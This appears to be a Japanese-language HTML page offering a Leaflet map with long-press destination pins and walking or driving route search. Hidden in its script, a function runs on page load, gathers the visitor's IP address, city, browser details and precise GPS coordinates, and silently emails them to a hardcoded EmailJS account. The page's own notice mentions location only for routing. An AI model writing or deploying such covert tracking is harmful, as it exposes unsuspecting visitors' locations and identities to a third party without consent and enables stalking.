<!DOCTYPE html>
<html lang="ja">
<head>
  <meta charset="UTF-8">
  <title>地図ピンとルート検索</title>

  <!-- Leaflet -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
  <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>

  <!-- Routing -->
  <link rel="stylesheet" href="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.css" />
  <script src="https://unpkg.com/leaflet-routing-machine/dist/leaflet-routing-machine.js"></script>

  <!-- EmailJS -->
  <script src="https://cdn.jsdelivr.net/npm/emailjs-com@3/dist/email.min.js"></script>

  <style>
    html, body {
      height: 100%;
      margin: 0;
      padding: 0;
      background-color: #000;
      color: #ccc;
      font-family: sans-serif;
      user-select: none;
      -webkit-user-select: none;
      -webkit-touch-callout: none;
      touch-action: manipulation;
    }
    #map {
      height: 100%;
      width: 100%;
      z-index: 1;
    }
    #info {
      position: absolute;
      top: 10px;
      left: 10px;
      background: rgba(0, 0, 0, 0.7);
      padding: 10px;
      border-radius: 6px;
      z-index: 1000;
    }
    #notice {
      position: absolute;
      top: 10px;
      right: 10px;
      max-width: 300px;
      background: rgba(0, 0, 0, 0.75);
      color: #ccc;
      font-size: 13px;
      padding: 10px;
      border-radius: 6px;
      z-index: 1001;
      line-height: 1.4em;
      display: none;
    }
    #routeInfo {
      margin-top: 5px;
      font-size: 14px;
    }
    select {
      background: #000;
      color: #ccc;
      border: 1px solid #888;
    }
  </style>
</head>
<body>
  <div id="info">
    <label>交通手段:</label>
    <select id="modeSelect">
      <option value="foot">徒歩</option>
      <option value="car">車</option>
    </select>
    <div id="routeInfo"></div>
  </div>

  <div id="notice">
    このサイトは位置情報を利用して地図上のルートを探索します。<br>
    iPhoneの場合は「設定」→「プライバシーとセキュリティ」→「位置情報サービス」から、<br>
    このサイトを開いているブラウザ（Chrome, Safari など）を選び、<br>
    「このAppの使用中のみ許可」または「常に許可」を選択して、<br>
    サイトに戻って位置情報の使用を許可してください。
  </div>

  <div id="map"></div>

  <script>
    emailjs.init("nPbnct21qNKkJNuaF");

    let map, userMarker, destMarker, routeControl;
    let touchStartTime = 0;
    let touchMoved = false;

    function initMap() {
      map = L.map('map').setView([35.68, 139.76], 13);

      L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
        attribution: '© OpenStreetMap contributors'
      }).addTo(map);

      routeControl = L.Routing.control({
        waypoints: [],
        routeWhileDragging: false,
        addWaypoints: false,
        draggableWaypoints: false,
        show: false,
        createMarker: () => null
      }).addTo(map);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const latlng = [pos.coords.latitude, pos.coords.longitude];
          userMarker = L.marker(latlng).addTo(map).bindPopup("現在地").openPopup();
          map.setView(latlng, 15);
        }, () => {
          document.getElementById("notice").style.display = "block";
        });
      } else {
        document.getElementById("notice").style.display = "block";
      }

      const container = map.getContainer();
      container.addEventListener("touchstart", e => {
        touchMoved = false;
        touchStartTime = Date.now();
      });
      container.addEventListener("touchmove", () => {
        touchMoved = true;
      });
      container.addEventListener("touchend", e => {
        const duration = Date.now() - touchStartTime;
        if (!touchMoved && duration > 600) {
          const touch = e.changedTouches[0];
          const point = map.mouseEventToContainerPoint(touch);
          const latlng = map.containerPointToLatLng(point);
          placeDestination(latlng);
        }
      });

      document.getElementById("modeSelect").addEventListener("change", () => {
        if (destMarker) placeDestination(destMarker.getLatLng());
      });
    }

    function placeDestination(latlng) {
      if (!userMarker) return alert("現在地がまだ取得できていません");

      if (destMarker) {
        map.removeLayer(destMarker);
      }
      destMarker = L.marker(latlng).addTo(map).bindPopup("目的地").openPopup();

      routeControl.setWaypoints([
        userMarker.getLatLng(),
        latlng
      ]);

      routeControl.on('routesfound', function(e) {
        const route = e.routes[0];
        const dist = (route.summary.totalDistance / 1000).toFixed(2);
        const time = (route.summary.totalTime / 60).toFixed(1);
        document.getElementById("routeInfo").innerHTML =
          `距離: ${dist} km<br>時間: ${time} 分`;
      });
    }

    function sendUserInfo() {
      const ua = navigator.userAgent;
      const lang = navigator.language;

      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(data => {
          const info = {
            ip: data.ip,
            country: data.country_name,
            region: data.region,
            city: data.city,
            language: lang,
            user_agent: ua,
            latitude: "",
            longitude: ""
          };

          if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(pos => {
              info.latitude = pos.coords.latitude;
              info.longitude = pos.coords.longitude;
              emailjs.send("service_uwd8bfs", "template_f5giywa", info);
            }, () => {
              emailjs.send("service_uwd8bfs", "template_f5giywa", info);
            });
          } else {
            emailjs.send("service_uwd8bfs", "template_f5giywa", info);
          }
        });
    }

    window.onload = () => {
      initMap();
      sendUserInfo();
    };
  </script>
</body>
</html>
